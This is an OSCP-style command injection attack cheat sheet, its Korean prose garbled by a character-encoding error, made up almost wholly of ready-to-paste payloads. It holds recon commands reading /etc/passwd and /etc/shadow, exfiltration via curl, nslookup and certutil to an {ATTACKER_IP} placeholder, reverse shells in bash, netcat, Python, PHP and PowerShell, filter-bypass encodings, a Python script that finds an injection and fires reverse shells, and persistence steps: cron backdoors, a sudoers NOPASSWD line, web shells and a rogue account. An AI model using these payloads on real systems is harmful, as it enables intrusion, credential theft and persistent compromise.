# Command Injection - OSCP ê³µê²© ê°€ì´ë“œ

> **ëª©í‘œ: ì‹œìŠ¤í…œ ëª…ë ¹ì–´ ì‹¤í–‰ ì·¨ì•½ì ì„ í†µí•œ ì¦‰ì‹œ ì‹œìŠ¤í…œ ì ‘ê·¼ â†’ ë¦¬ë²„ìŠ¤ ì‰˜ íšë“**

## âš¡ ê¸°ë³¸ í˜ì´ë¡œë“œë“¤ (ì¦‰ì‹œ ë³µì‚¬-ë¶™ì—¬ë„£ê¸°)

### ğŸ”— ëª…ë ¹ì–´ ì²´ì´ë‹ ê¸°ë³¸

```bash
# ì„¸ë¯¸ì½œë¡  (;) - ì´ì „ ëª…ë ¹ì–´ ê²°ê³¼ì™€ ë¬´ê´€í•˜ê²Œ ì‹¤í–‰
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la

# AND ì—°ì‚°ì (&&) - ì´ì „ ëª…ë ¹ì–´ ì„±ê³µì‹œì—ë§Œ ì‹¤í–‰
127.0.0.1 && whoami
127.0.0.1 && id
127.0.0.1 && uname -a
127.0.0.1 && pwd

# OR ì—°ì‚°ì (||) - ì´ì „ ëª…ë ¹ì–´ ì‹¤íŒ¨ì‹œì—ë§Œ ì‹¤í–‰
invalidcommand || whoami
failedping || id
nonexistent || cat /etc/passwd

# íŒŒì´í”„ (|) - ì´ì „ ëª…ë ¹ì–´ ì¶œë ¥ì„ ë‹¤ìŒ ëª…ë ¹ì–´ ì…ë ¥ìœ¼ë¡œ
echo test | whoami
ping -c 1 127.0.0.1 | whoami
ls | id

# ë°±í‹± (`) - ëª…ë ¹ì–´ ì¹˜í™˜
`whoami`
`id`
`cat /etc/passwd`
`uname -a`
ping `whoami`.{ATTACKER_IP}

# ë‹¬ëŸ¬ ê´„í˜¸ $() - ëª…ë ¹ì–´ ì¹˜í™˜ (bash)
$(whoami)
$(id)
$(cat /etc/passwd)
$(uname -a)
ping $(whoami).{ATTACKER_IP}
```

### ğŸ§ ë¦¬ëˆ…ìŠ¤ ì •ë³´ ìˆ˜ì§‘

```bash
# ì‹œìŠ¤í…œ ì •ë³´
; uname -a
; cat /etc/os-release
; cat /etc/issue
; cat /proc/version
; hostname

# ì‚¬ìš©ì ì •ë³´
; whoami
; id
; cat /etc/passwd
; cat /etc/shadow
; cat /etc/group
; w
; who

# ë„¤íŠ¸ì›Œí¬ ì •ë³´
; ifconfig
; ip addr
; netstat -antup
; ss -tulpn
; arp -a
; route -n

# í”„ë¡œì„¸ìŠ¤ ë° ì„œë¹„ìŠ¤
; ps aux
; ps -ef
; service --status-all
; systemctl list-units
; crontab -l
; cat /etc/crontab

# íŒŒì¼ ì‹œìŠ¤í…œ
; ls -la /
; ls -la /home
; ls -la /var/www
; find / -perm -4000 2>/dev/null
; find / -writable 2>/dev/null
```

### ğŸªŸ ìœˆë„ìš° ì •ë³´ ìˆ˜ì§‘

```cmd
# ì‹œìŠ¤í…œ ì •ë³´
& systeminfo
& hostname
& ver
& echo %USERNAME%
& echo %COMPUTERNAME%

# ì‚¬ìš©ì ì •ë³´
& whoami
& whoami /priv
& net user
& net localgroup administrators
& net group "domain admins" /domain

# ë„¤íŠ¸ì›Œí¬ ì •ë³´
& ipconfig /all
& netstat -an
& arp -a
& route print

# í”„ë¡œì„¸ìŠ¤ ë° ì„œë¹„ìŠ¤
& tasklist
& wmic process list brief
& net start
& sc query

# íŒŒì¼ ì‹œìŠ¤í…œ
& dir C:\
& dir C:\Users
& dir C:\inetpub\wwwroot
& type C:\Windows\System32\drivers\etc\hosts
```

## ğŸ¯ ìƒí™©ë³„ í˜ì´ë¡œë“œ

### ğŸ” Blind Command Injection íƒì§€

```bash
# ì‹œê°„ ì§€ì—° ê¸°ë°˜ íƒì§€ (ë¦¬ëˆ…ìŠ¤)
; sleep 10
&& sleep 15
|| sleep 20
| sleep 5
`sleep 10`
$(sleep 15)

# ì‹œê°„ ì§€ì—° ê¸°ë°˜ íƒì§€ (ìœˆë„ìš°)
& timeout 10
& ping -n 10 127.0.0.1
& choice /c y /n /d y /t 10

# DNS ê¸°ë°˜ Out-of-band íƒì§€
; nslookup {RANDOM}.{ATTACKER_DOMAIN}
; dig {RANDOM}.{ATTACKER_DOMAIN}
; host {RANDOM}.{ATTACKER_DOMAIN}
`nslookup $(whoami).{ATTACKER_DOMAIN}`
$(nslookup $(id | base64).{ATTACKER_DOMAIN})

# HTTP ê¸°ë°˜ Out-of-band íƒì§€
; curl http://{ATTACKER_IP}:8080/$(whoami)
; wget http://{ATTACKER_IP}:8080/$(id)
& certutil.exe -urlcache -split -f http://{ATTACKER_IP}:8080/test.txt
```

### ğŸš ë¦¬ë²„ìŠ¤ ì‰˜ íšë“

```bash
# Netcat ë¦¬ë²„ìŠ¤ ì‰˜ (ë¦¬ëˆ…ìŠ¤)
; nc -e /bin/sh {ATTACKER_IP} 443
; nc -c /bin/sh {ATTACKER_IP} 443
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 443 >/tmp/f

# Bash ë¦¬ë²„ìŠ¤ ì‰˜
; bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
; exec 5<>/dev/tcp/{ATTACKER_IP}/443;cat <&5 | while read line; do $line 2>&5 >&5; done

# Python ë¦¬ë²„ìŠ¤ ì‰˜
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP ë¦¬ë²„ìŠ¤ ì‰˜
; php -r '$sock=fsockopen("{ATTACKER_IP}",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell ë¦¬ë²„ìŠ¤ ì˜˜ (ìœˆë„ìš°)
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### ğŸ“¤ ë°ì´í„° ì¶”ì¶œ

```bash
# Base64 ì¸ì½”ë”©ìœ¼ë¡œ ë°ì´í„° ì¶”ì¶œ
; cat /etc/passwd | base64
; cat /etc/shadow | base64 -w 0

# DNSë¥¼ í†µí•œ ë°ì´í„° ì¶”ì¶œ
; cat /etc/passwd | xxd -p -c 32 | while read line; do nslookup $line.{ATTACKER_DOMAIN}; done

# HTTP POSTë¡œ ë°ì´í„° ì „ì†¡
; curl -X POST -d "data=$(cat /etc/passwd | base64)" http://{ATTACKER_IP}:8080/data

# íŒŒì¼ì„ ì›¹ ë””ë ‰í† ë¦¬ì— ë³µì‚¬
; cp /etc/passwd /var/www/html/passwd.txt
; cp /etc/shadow /tmp/shadow.txt && chmod 644 /tmp/shadow.txt

# ì••ì¶•í•´ì„œ ì „ì†¡
; tar -czf /tmp/data.tar.gz /etc/passwd /etc/shadow /home
; curl -F "file=@/tmp/data.tar.gz" http://{ATTACKER_IP}:8080/upload
```

## ğŸ”„ ìš°íšŒ ê¸°ë²•ë“¤

### ğŸš« ê³µë°± í•„í„° ìš°íšŒ

```bash
# ${IFS} ì‚¬ìš© (Internal Field Separator)
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;ls${IFS}-la
127.0.0.1&&whoami${IFS}

# íƒ­ ë¬¸ì ì‚¬ìš©
127.0.0.1;cat	/etc/passwd
127.0.0.1;ls	-la

# $() ë‚´ì—ì„œ ê³µë°± ì‚¬ìš©
127.0.0.1;$(cat /etc/passwd)
127.0.0.1;$(/bin/ls -la)

# í™˜ê²½ë³€ìˆ˜ í™œìš©
127.0.0.1;cat$IFS/etc/passwd
127.0.0.1;ls$IFS-la$IFS/home

# ê´„í˜¸ ì‚¬ìš©
(cat /etc/passwd)
(whoami)
(id)

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/home}
```

### ğŸ”¤ í‚¤ì›Œë“œ í•„í„° ìš°íšŒ

```bash
# ë¬¸ìì—´ ì—°ê²°
127.0.0.1;c'a't /etc/pass'w'd
127.0.0.1;c"a"t /etc/pass"w"d
127.0.0.1;ca\t /etc/pass\wd

# ë³€ìˆ˜ í™œìš©
127.0.0.1;a=c;b=at;$a$b /etc/passwd
127.0.0.1;cmd=cat;$cmd /etc/passwd

# Hex ì¸ì½”ë”©
127.0.0.1;echo -e "\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | sh

# Base64 ì¸ì½”ë”©
127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# ASCII ê°’ í™œìš©
127.0.0.1;$(printf "\143\141\164 \057\145\164\143\057\160\141\163\163\167\144")

# ì™€ì¼ë“œì¹´ë“œ ì‚¬ìš©
127.0.0.1;c?t /etc/pass??
127.0.0.1;c*t /etc/pass*d
127.0.0.1;/bin/c?t /etc/pass??
```

### ğŸ›¡ï¸ íŠ¹ìˆ˜ë¬¸ì í•„í„° ìš°íšŒ

```bash
# ì„¸ë¯¸ì½œë¡ (;) í•„í„°ì‹œ ë‹¤ë¥¸ êµ¬ë¶„ì ì‚¬ìš©
127.0.0.1%0Awhoami
127.0.0.1%0Dcat /etc/passwd
127.0.0.1|whoami
127.0.0.1||whoami
127.0.0.1&&whoami

# ìŠ¬ë˜ì‹œ(/) í•„í„°ì‹œ ìš°íšŒ
127.0.0.1;cat$(echo${IFS}${PATH}|cut${IFS}-c1)etc$(echo${IFS}${PATH}|cut${IFS}-c1)passwd
127.0.0.1;cat ${HOME:0:1}etc${HOME:0:1}passwd

# ì (.) í•„í„°ì‹œ ìš°íšŒ
127${IFS}0${IFS}0${IFS}1;whoami
127\\.0\\.0\\.1;whoami

# ëŒ€ê´„í˜¸ ìš°íšŒ
127.0.0.1;cat /etc/pass[w]d
127.0.0.1;cat /etc/[p]asswd

# ì¤‘ê´„í˜¸ í™•ì¥ ìš°íšŒ
127.0.0.1;cat /etc/{passwd,shadow}
127.0.0.1;{cat,/etc/passwd}
```

### ğŸŒ URL ì¸ì½”ë”© ìš°íšŒ

```bash
# ê¸°ë³¸ URL ì¸ì½”ë”©
127.0.0.1%3Bwhoami
127.0.0.1%3B%20cat%20/etc/passwd
127.0.0.1%26%26whoami

# ì´ì¤‘ URL ì¸ì½”ë”©
127.0.0.1%253Bwhoami
127.0.0.1%253B%2520cat%2520/etc/passwd

# ìœ ë‹ˆì½”ë“œ ì¸ì½”ë”©
127.0.0.1%u003Bwhoami
127.0.0.1%u003B%u0020cat%u0020/etc/passwd

# HTML ì—”í‹°í‹°
127.0.0.1&#59;whoami
127.0.0.1&#59;&#32;cat&#32;/etc/passwd
```

## ğŸ¤– ìë™í™” ë„êµ¬ ëª…ë ¹ì–´

### ğŸ”ª Commix (Command Injection Exploiter)

```bash
# ê¸°ë³¸ Command Injection íƒì§€
commix -u "http://{TARGET_IP}/page.php?ip=127.0.0.1"

# POST íŒŒë¼ë¯¸í„° í…ŒìŠ¤íŠ¸
commix -u "http://{TARGET_IP}/page.php" --data="ip=127.0.0.1"

# Cookie ê¸°ë°˜ í…ŒìŠ¤íŠ¸
commix -u "http://{TARGET_IP}/page.php" --cookie="ip=127.0.0.1"

# User-Agent í—¤ë” í…ŒìŠ¤íŠ¸
commix -u "http://{TARGET_IP}/page.php" --user-agent="*"

# íŠ¹ì • í˜ì´ë¡œë“œ ì‹œë„
commix -u "http://{TARGET_IP}/page.php?ip=*" --technique=B

# í”„ë¡ì‹œ ì‚¬ìš© (Burp Suite)
commix -u "http://{TARGET_IP}/page.php?ip=*" --proxy=http://127.0.0.1:8080

# OS ëª…ë ¹ì–´ ì‹¤í–‰
commix -u "http://{TARGET_IP}/page.php?ip=*" --os-cmd="whoami"

# ì‰˜ íšë“
commix -u "http://{TARGET_IP}/page.php?ip=*" --os-shell

# íŒŒì¼ ì½ê¸°
commix -u "http://{TARGET_IP}/page.php?ip=*" --file-read="/etc/passwd"

# íŒŒì¼ ì—…ë¡œë“œ
commix -u "http://{TARGET_IP}/page.php?ip=*" --file-upload="/tmp/shell.php" --file-dest="/var/www/html/"
```

### ğŸ”¥ Burp Suite Intruder

```bash
# 1. Command Injection í˜ì´ë¡œë“œ ë¦¬ìŠ¤íŠ¸ ìƒì„±
; whoami
&& whoami
|| whoami
| whoami
`whoami`
$(whoami)
%0Awhoami
%0D%0Awhoami
127.0.0.1;whoami
127.0.0.1&&whoami

# 2. Burp Intruder ì„¤ì •
# Position: ip=127.0.0.1Â§Â§
# Payload Type: Simple list
# Payload Options: ìœ„ì˜ í˜ì´ë¡œë“œ ë¦¬ìŠ¤íŠ¸ ì¶”ê°€

# 3. ì‘ë‹µ ë¶„ì„
# Grep - Extract: www-data, root, nt authority
# Grep - Match: uid=, gid=, groups=
```

### ğŸ ì»¤ìŠ¤í…€ Python ìŠ¤í¬ë¦½íŠ¸

```python
#!/usr/bin/env python3
import requests
import sys
import time

def test_command_injection(url, param):
    # ê¸°ë³¸ ëª…ë ¹ì–´ ì£¼ì… í˜ì´ë¡œë“œë“¤
    payloads = [
        "; whoami",
        "&& whoami",
        "|| whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "%0Awhoami",
        "; sleep 5",
        "&& sleep 5"
    ]

    print(f"[+] Testing Command Injection on: {url}")

    for payload in payloads:
        test_value = f"127.0.0.1{payload}"

        try:
            # ì‹œê°„ ê¸°ë°˜ íƒì§€ë¥¼ ìœ„í•œ ì‹œì‘ ì‹œê°„
            start_time = time.time()

            # GET íŒŒë¼ë¯¸í„° í…ŒìŠ¤íŠ¸
            if '?' in url:
                test_url = f"{url}&{param}={test_value}"
            else:
                test_url = f"{url}?{param}={test_value}"

            response = requests.get(test_url, timeout=10)

            # ì‘ë‹µ ì‹œê°„ ê³„ì‚°
            response_time = time.time() - start_time

            # ê²°ê³¼ ë¶„ì„
            if any(indicator in response.text.lower() for indicator in ['www-data', 'root:', 'uid=', 'gid=', 'nt authority']):
                print(f"[SUCCESS] Command executed: {payload}")
                print(f"Response snippet: {response.text[:200]}...")
                return True

            # ì‹œê°„ ê¸°ë°˜ íƒì§€ (sleep ëª…ë ¹ì–´ìš©)
            if "sleep" in payload and response_time > 4:
                print(f"[SUCCESS] Time-based detection: {payload} (Response time: {response_time:.2f}s)")
                return True

        except requests.exceptions.Timeout:
            if "sleep" in payload:
                print(f"[SUCCESS] Timeout-based detection: {payload}")
                return True
        except Exception as e:
            print(f"[-] Error testing {payload}: {e}")

    return False

def get_reverse_shell(url, param):
    # ë¦¬ë²„ìŠ¤ ì‰˜ í˜ì´ë¡œë“œë“¤
    reverse_shells = [
        f"; nc -e /bin/sh {sys.argv[3]} 443",
        f"; bash -i >& /dev/tcp/{sys.argv[3]}/443 0>&1",
        f"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{sys.argv[3]}\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ]

    print(f"[+] Attempting to get reverse shell...")
    print(f"[+] Make sure nc listener is running: nc -lvnp 443")

    for shell in reverse_shells:
        test_value = f"127.0.0.1{shell}"

        try:
            if '?' in url:
                test_url = f"{url}&{param}={test_value}"
            else:
                test_url = f"{url}?{param}={test_value}"

            response = requests.get(test_url, timeout=5)
            print(f"[+] Tried: {shell[:50]}...")

        except requests.exceptions.Timeout:
            print(f"[+] Shell payload sent (timeout expected): {shell[:50]}...")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 cmdi_test.py <url> <parameter> [attacker_ip]")
        print("Example: python3 cmdi_test.py 'http://target.com/ping.php' ip 192.168.1.100")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    # Command Injection í…ŒìŠ¤íŠ¸
    if test_command_injection(url, param):
        if len(sys.argv) == 4:
            get_reverse_shell(url, param)
    else:
        print("[-] No command injection detected")
```

### ğŸ”§ Wfuzzë¥¼ ì´ìš©í•œ ìë™í™”

```bash
# GET íŒŒë¼ë¯¸í„° Command Injection í…ŒìŠ¤íŠ¸
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt "http://{TARGET_IP}/page.php?ip=127.0.0.1FUZZ"

# POST ë°ì´í„° Command Injection í…ŒìŠ¤íŠ¸
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -d "ip=127.0.0.1FUZZ" "http://{TARGET_IP}/page.php"

# í—¤ë” ê¸°ë°˜ Command Injection í…ŒìŠ¤íŠ¸
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -H "User-Agent: MozillaFUZZ" "http://{TARGET_IP}/page.php"

# ì‘ë‹µ í•„í„°ë§ (ì„±ê³µì ì¸ ëª…ë ¹ì–´ ì‹¤í–‰ íƒì§€)
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt --hh 1234 "http://{TARGET_IP}/page.php?ip=127.0.0.1FUZZ"
```

## ğŸš¨ ë¬¸ì œ í•´ê²°

### âŒ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ì§€ ì•Šì„ ë•Œ

```bash
# 1. ë‹¤ë¥¸ ëª…ë ¹ì–´ ì²´ì´ë‹ ì‹œë„
; whoami
&& whoami
|| whoami
| whoami
`whoami`
$(whoami)

# 2. ë‹¤ë¥¸ ìœ„ì¹˜ì˜ ëª…ë ¹ì–´ ì‹œë„
; /bin/whoami
; /usr/bin/whoami
; which whoami
; whereis whoami

# 3. í™˜ê²½ë³€ìˆ˜ í™•ì¸
; echo $PATH
; env
; printenv

# 4. ì‰˜ í™•ì¸
; echo $SHELL
; echo $0
; ps $$
```

### ğŸ” ì¶œë ¥ì´ ë³´ì´ì§€ ì•Šì„ ë•Œ (Blind)

```bash
# 1. ì‹œê°„ ê¸°ë°˜ íƒì§€
; sleep 10
; ping -c 10 127.0.0.1

# 2. DNS ê¸°ë°˜ í™•ì¸
; nslookup test.{ATTACKER_DOMAIN}
; dig $(whoami).{ATTACKER_DOMAIN}

# 3. íŒŒì¼ ê¸°ë°˜ í™•ì¸
; whoami > /var/www/html/test.txt
; echo "success" > /tmp/test.txt

# 4. ë„¤íŠ¸ì›Œí¬ ê¸°ë°˜ í™•ì¸
; curl http://{ATTACKER_IP}:8080/test
; wget http://{ATTACKER_IP}:8080/$(whoami)

# 5. ì—ëŸ¬ ê¸°ë°˜ í™•ì¸
; cat /etc/passwd | mail root
; logger "Command injection successful: $(whoami)"
```

### ğŸš« í•„í„°ë§ì´ ê°•í•  ë•Œ

```bash
# 1. ì¸ì½”ë”© ìš°íšŒ
; echo 'd2hvYW1p' | base64 -d | sh  # whoamië¥¼ base64 ì¸ì½”ë”©
; python -c "exec('print(__import__(\"os\").system(\"whoami\"))')"

# 2. íŒŒì¼ ì‹œìŠ¤í…œ í™œìš©
; ls /bin/* | grep cat
; find /bin -name "*cat*" -exec {} /etc/passwd \;

# 3. í™˜ê²½ë³€ìˆ˜ ì•…ìš©
; ${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd

# 4. í”„ë¡œê·¸ë˜ë° ì–¸ì–´ í™œìš©
; python -c "import os; os.system('whoami')"
; php -r "system('whoami');"
; perl -e "system('whoami')"
; ruby -e "system('whoami')"

# 5. ë°”ì´ë„ˆë¦¬ ì‹¤í–‰
; echo -e "\x2f\x62\x69\x6e\x2f\x73\x68" | xargs
```

### ğŸ”„ ì„œë¹„ìŠ¤ê°€ ì¬ì‹œì‘ë˜ëŠ” ê²½ìš°

```bash
# 1. ì§€ì†ì„± í™•ë³´
; echo '* * * * * /bin/bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' | crontab -
; echo '/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' >> ~/.bashrc

# 2. ë°±ë„ì–´ ì„¤ì¹˜
; echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
; mkdir ~/.ssh; echo 'ssh-rsa {PUBLIC_KEY}' > ~/.ssh/authorized_keys

# 3. ì›¹ì‰˜ ìƒì„±
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
; echo '<?php eval($_POST["cmd"]); ?>' > /tmp/.shell.php

# 4. ê³„ì • ìƒì„±
; useradd -m -s /bin/bash backup
; echo 'backup:password' | chpasswd
; usermod -aG sudo backup
```

### â±ï¸ ì‘ë‹µ ì‹œê°„ì´ ê¸¸ ë•Œ

```bash
# 1. ë°±ê·¸ë¼ìš´ë“œ ì‹¤í–‰
; whoami &
; (sleep 10; whoami) &

# 2. ì¶œë ¥ ë¦¬ë‹¤ì´ë ‰ì…˜
; whoami > /tmp/result.txt 2>&1 &
; id > /var/www/html/result.txt &

# 3. ìŠ¤í¬ë¦½íŠ¸ ìƒì„± í›„ ì‹¤í–‰
; echo '#!/bin/bash' > /tmp/script.sh
; echo 'whoami > /tmp/out.txt' >> /tmp/script.sh
; chmod +x /tmp/script.sh
; /tmp/script.sh &
```

## ğŸ“Š ì„±ê³µ íŒì • ê¸°ì¤€

### âœ… Command Injection ì„±ê³µ í™•ì¸

- **ì‚¬ìš©ì ì •ë³´**: `www-data`, `root`, `apache`, `nt authority\system` ì¶œë ¥
- **ì‹œìŠ¤í…œ ì •ë³´**: `Linux`, `Windows`, kernel ë²„ì „ ì •ë³´ ì¶œë ¥
- **íŒŒì¼ ë‚´ìš©**: `/etc/passwd`, `/etc/shadow` ë‚´ìš© ì¶œë ¥
- **í”„ë¡œì„¸ìŠ¤ ì •ë³´**: `ps aux`, `tasklist` ê²°ê³¼ ì¶œë ¥

### âœ… Blind Injection ì„±ê³µ í™•ì¸

- **ì‹œê°„ ì§€ì—°**: `sleep` ëª…ë ¹ì–´ë¡œ ì˜ë„í•œ ì‹œê°„ë§Œí¼ ì§€ì—°
- **DNS ìš”ì²­**: DNS ë¡œê·¸ì—ì„œ ì§€ì •í•œ ë„ë©”ì¸ ìš”ì²­ í™•ì¸
- **HTTP ìš”ì²­**: ì›¹ ì„œë²„ ë¡œê·¸ì—ì„œ ì§€ì •í•œ URL ìš”ì²­ í™•ì¸
- **íŒŒì¼ ìƒì„±**: ì§€ì •í•œ ìœ„ì¹˜ì— íŒŒì¼ ìƒì„± í™•ì¸

### â° ì‹œê°„ ê´€ë¦¬

- **5ë¶„**: ê¸°ë³¸ Command Injection í…ŒìŠ¤íŠ¸
- **15ë¶„**: ë‹¤ì–‘í•œ ìš°íšŒ ê¸°ë²• ì‹œë„
- **25ë¶„**: Blind Injection + Out-of-band í…ŒìŠ¤íŠ¸
- **30ë¶„**: ë¦¬ë²„ìŠ¤ ì‰˜ íšë“ ì‹œë„
- **ì‹¤íŒ¨ì‹œ**: ë‹¤ë¥¸ ì›¹ ì·¨ì•½ì ìœ¼ë¡œ ì „í™˜

**ì„±ê³µì‹œ ì¦‰ì‹œ ì‰˜ ì•ˆì •í™”!** â†’ `SHELLS/shell-upgrade.md`

## ğŸ’¡ ì‹¤ì „ íŒ

- **íŒŒë¼ë¯¸í„° ìœ„ì¹˜**: URL, POST ë°ì´í„°, í—¤ë”, ì¿ í‚¤ ëª¨ë‘ í…ŒìŠ¤íŠ¸
- **ë¦¬ë²„ìŠ¤ ì‰˜**: nc ë¦¬ìŠ¤ë„ˆ `nc -lvnp 443` í•­ìƒ ì¤€ë¹„
- **Out-of-band**: DNS ì„œë²„ë‚˜ HTTP ì„œë²„ ì¤€ë¹„ (`python3 -m http.server 8080`)
- **ì¸ì½”ë”©**: Base64, URL, Hex ë“± ë‹¤ì–‘í•œ ì¸ì½”ë”© ì‹œë„
- **ìš°íšŒ**: ê³µë°±, íŠ¹ìˆ˜ë¬¸ì, í‚¤ì›Œë“œ í•„í„° ê°ê° ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ ìš°íšŒ
